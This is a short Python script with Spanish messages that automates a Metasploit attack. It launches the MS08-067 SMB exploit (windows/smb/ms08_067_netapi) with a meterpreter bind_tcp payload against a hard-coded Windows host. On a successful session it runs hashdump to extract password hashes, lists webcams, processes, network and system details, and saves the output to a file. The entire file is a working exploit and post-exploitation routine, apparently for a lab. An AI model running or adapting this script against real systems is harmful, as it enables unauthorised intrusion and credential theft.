from metasploit.msfrpc import MsfRpcClient
import time


def save(contenido):
    narchivo = ("resultado-" + time.strftime("%Y-%m-%d_%H:%M") +
    ".txt")
    file = open(narchivo, "w")
    file.write(contenido)
    print "Resultado guardado en " + narchivo



#msfrpcd -U msf -P test -f
ip_remota = '192.168.1.208'
cli = MsfRpcClient(username="msf", password="test")
lista = cli.modules.exploits
exploit = cli.modules.use('exploit', 'windows/smb/ms08_067_netapi')
exploit['RHOST'] = ip_remota
exploit.execute(payload='windows/meterpreter/bind_tcp')
#print cli.sessions.list
if not cli.sessions.list:
    print 'no hay sesiones activas aun'
else:
    print cli.sessions
    shell = cli.sessions.session(1)
    shell.write("hashdump")
    buff = shell.read()
    #time.sleep(5)
    shell.write("ipconfig")
    buff += shell.read()
    shell.write("webcam_list")
    buff += shell.read()
    #time.sleep(1)
    shell.write("idletime")
    #time.sleep(5)
    buff += shell.read()
    shell.write("ps")
    buff += shell.read()
    shell.write("sysinfo")
    buff += shell.read()
    shell.write("route")
    buff += shell.read()
    print buff
    save(buff)